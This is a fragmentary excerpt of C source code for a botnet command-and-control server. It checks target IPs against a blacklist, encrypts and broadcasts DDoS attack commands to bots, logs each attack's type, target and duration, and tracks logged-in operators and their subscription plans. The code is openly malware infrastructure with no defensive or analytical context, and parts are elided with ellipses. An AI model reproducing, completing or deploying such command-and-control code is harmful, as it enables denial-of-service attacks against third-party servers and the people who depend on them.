								        if (strstr(line3, argv[2]) != NULL){
								        	sprintf(usethis, "\e[38;5;201mThe IP %s Is Blacklisted\r\n", argv[2]);	
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
											sprintf(usethis, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", managements[datafd].id);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								    }
								}
								fclose(f3);
								...
								char testthing[800];	
								enc(jhere);
								sprintf(testthing, "Encrypted DDOS STRING!: %s\n", jhere);
								


            					broadcast(buf, 0, "lol");
            					printf("[Botnet]:\e[38;5;201m%s\e[1;01;35m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            					...
            					{
            						sprintf(botnet, "\r\n\e[38;5;201m%s\e[1;01;35m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            						if(send(sendattacklisten, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
								      
            						sprintf(usethis, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", managements[sendattacklisten].id);
            ...
            else if(strcasestr(buf, "CLEAR") || strcasestr(buf, "cls")) {
			{
				...
				if(strlen(motd) > 2)
				{
					sprintf(banner0,  "\e[38;5;201mMOTD:\e[38;5;201m %s\r\n", motd); 
					if(send(datafd, banner0, strlen(banner0), MSG_NOSIGNAL) == -1) goto end;
				}
					if(send(datafd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
	...
	if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				...
				for(logoutshit=0;logoutshit<MAXFDS;logoutshit++)
				{
					if(managements[logoutshit].LoginListen == 1 && managements[logoutshit].connected == 1 && loggedin == 0)
					{
						...
						sprintf(usethis, "\r\n\e[38;5;201m%s Plan: [%s] Just Logged Out!\r\n", managements[datafd].id, managements[datafd].planname);
						printf("[Botnet]:%s Plan: [%s] Just Logged Out!\n", managements[datafd].id, managements[datafd].planname);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201mbotnet\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201m%s\x1b[01;35m>\e[38;5;201m ", managements[logoutshit].id);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
				}
		loggedin = 1;
